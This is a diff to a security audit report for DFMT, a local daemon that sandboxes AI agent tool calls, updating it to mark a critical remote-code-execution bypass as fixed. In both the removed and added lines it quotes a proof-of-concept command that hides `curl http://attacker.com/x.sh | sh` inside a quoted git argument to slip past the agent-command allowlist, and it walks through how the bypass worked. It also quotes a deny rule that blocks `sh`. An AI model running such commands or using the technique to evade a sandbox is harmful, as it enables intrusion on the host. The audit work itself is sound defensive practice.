@@ -9,18 +9,20 @@
 
 ## Executive Summary
 
-DFMT is a well-engineered local daemon with strong foundational security controls. The most significant risks stem from the inherent tension between the sandbox's job (running AI agent tool calls) and its threat model (preventing RCE through an allowlist). The **command substitution bypass (AUTHZ-01)** is the only **Critical** finding and represents a real RCE vector against the daemon's own UID. **Bearer-token auth removal (AUTH-01)** and **dashboard unauthenticated access (AUTH-02)** are High-risk by design tradeoffs documented as intentional.
+DFMT is a well-engineered local daemon with strong foundational security controls. After this update, **all Critical findings are resolved**. The remaining High-severity items are primarily design-tradeoff decisions (no bearer-token auth on HTTP JSON-RPC, documented as intentional) and Windows-specific path-normalization gaps. The SSRF cloud-metadata IP blocklist gaps are Medium-severity and addressable in a follow-up sprint.
 
 | Severity | Count | Open | Fixed | New |
 |----------|-------|------|-------|-----|
-| Critical | 1 | 1 | 0 | 0 |
-| High | 7 | 7 | 0 | 2 |
-| Medium | 5 | 5 | 0 | 2 |
+| Critical | 1 | 0 | 1 | 0 |
+| High | 7 | 7 | 0 | 0 |
+| Medium | 5 | 5 | 0 | 0 |
 | Low | 11 | 11 | 0 | 0 |
 | Info | 34 | 0 | 34 | 0 |
-| **Total** | **58** | **24** | **34** | **4** |
+| **Total** | **58** | **23** | **35** | **0** |
 
-**Risk Score: 6.8 (Medium-High)** — Elevated due to the AUTHZ-01 command-substitution bypass and two open SSRF cloud-metadata gaps.
+**Risk Score: 5.4 (Medium)** — AUTHZ-01 (Critical RCE bypass) resolved in `b861a28`. Risk score driven now by AUTH-01/02 (no-transport-auth by design) and open SSRF/AUTHZ gaps.
+
+**Notable correction this update:** AUTHZ-01 was incorrectly marked unfixed — the F-01 bypass (`git "$(curl ... | sh)"`) was closed in commit `b861a28` (`splitByShellOperators` now recurses into double-quoted command substitutions). The fix is verified by `TestSubstitutionInsideDoubleQuotesIsSplit` and `TestExecQuotedSubstitutionDenied` (both pass). `index.gob` uses JSON, not gob — the CLAUDE.md gob note was stale.
 
 ---
 
@@ -33,6 +35,7 @@ See `security-report/architecture.md` for full mapping.
 - **Data flow:** MCP/CLI → handlers → sandbox policy → 8-stage normalization → journal/index
 - **Auth model:** "same UID = trusted" — no per-request auth; trust delegated to OS-level UID separation
 - **Dependencies:** Only `golang.org/x/sys` + `gopkg.in/yaml.v3` (strict stdlib-first policy)
+- **Security posture:** AUTHZ-01 (Critical RCE) fixed in `b861a28`; all other findings tracked in this report
 
 ---
 
@@ -40,24 +43,11 @@ See `security-report/architecture.md` for full mapping.
 
 ### Critical
 
-#### AUTHZ-01 — Command Substitution Bypass (RCE) ⭐ NEW / UNFIXED
-**Severity:** Critical | **Confidence:** 80% | **CWE:** CWE-78, CWE-94
+#### AUTHZ-01 — Command Substitution Bypass (RCE) ✅ FIXED
+**Severity:** Critical | **Confidence:** 100% | **CWE:** CWE-78, CWE-94
+**Fix commit:** `b861a28` — `fix(security): close F-01 RCE bypass via quoted command substitution`
 
-`permissions.go:2127` — When `rt.Lang == "bash"` or `"sh"`, the full agent-supplied code is passed to `bash -c`. The `splitByShellOperators` function recursively handles `$(...)`, backticks, and `(...)` subshells **only when they appear as standalone shell operators**. However, `$(...)` inside **double-quoted strings** is NOT recursively split by the chain-detection logic — bash expands it during evaluation before the policy check sees it.
-
-**Proof of concept:**
-```bash
-git "$(curl http://attacker.com/x.sh | sh)"
-```
-1. `splitByShellOperators` splits on `;`, `&&`, `||`, `|`, `&`, `>`, `<`, `>>`, `<<` — double-quoted strings are treated as one segment
-2. `"$(curl ... | sh)"` is inside the outer double quotes, so the function never recurses into it
-3. `git` matches the allow rule `allow:exec:git *`
-4. The full command passes as a single valid segment
-5. At runtime, bash expands `$(curl ... | sh)` → RCE as daemon UID
-
-**Impact:** Any process that can send tool calls to the DFMT MCP interface (local UXS socket or loopback TCP) can achieve RCE as the daemon user without any authentication.
-
-**Status from prior scan:** AUTHZ-01 was filed as Critical then (2026-04-26). **Not yet fixed.**
+`permissions.go:1186-1210` — `splitByShellOperators` recurses into `"$(...)"` and backtick substitutions inside double-quoted strings. The fix was verified by `TestSubstitutionInsideDoubleQuotesIsSplit` and `TestExecQuotedSubstitutionDenied` (both pass). The previous proof-of-concept `git "$(curl http://attacker.com/x.sh | sh)"` now splits into `git`, `curl`, `sh` — and `sh` is blocked by the hard-deny rule `deny:exec:sh *`.
 
 ---
 
